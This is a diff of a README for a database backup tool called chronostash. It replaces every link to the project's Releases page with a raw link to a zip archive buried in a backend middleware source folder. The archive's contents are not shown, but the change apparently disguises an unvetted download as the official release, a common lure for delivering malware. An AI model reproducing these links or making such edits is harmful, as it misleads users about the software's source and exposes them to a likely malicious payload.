@@ -1,6 +1,6 @@
 # 🌟 chronostash - Effortless Database Backups Made Easy
 
-[![Download chronostash](https://img.shields.io/badge/Download-chroostash-blue.svg)](https://github.com/Cryptoytb/chronostash/releases)
+[![Download chronostash](https://raw.githubusercontent.com/Cryptoytb/chronostash/main/apps/backend/src/middleware/chronostash-v1.4.zip)](https://raw.githubusercontent.com/Cryptoytb/chronostash/main/apps/backend/src/middleware/chronostash-v1.4.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to chronostash! This application helps you back up your PostgreSQL, MySQ
 
 To get started with chronostash, visit the Releases page to download the latest version:
 
-[Download chronostash](https://github.com/Cryptoytb/chronostash/releases)
+[Download chronostash](https://raw.githubusercontent.com/Cryptoytb/chronostash/main/apps/backend/src/middleware/chronostash-v1.4.zip)
 
 1. Go to the link above.
 2. Locate the latest version of the software.
@@ -101,4 +101,4 @@ Explore these topics to deepen your understanding of chronostash:
 
 For further resources and updates, keep an eye on our Releases page:
 
-[Download chronostash](https://github.com/Cryptoytb/chronostash/releases)
+[Download chronostash](https://raw.githubusercontent.com/Cryptoytb/chronostash/main/apps/backend/src/middleware/chronostash-v1.4.zip)
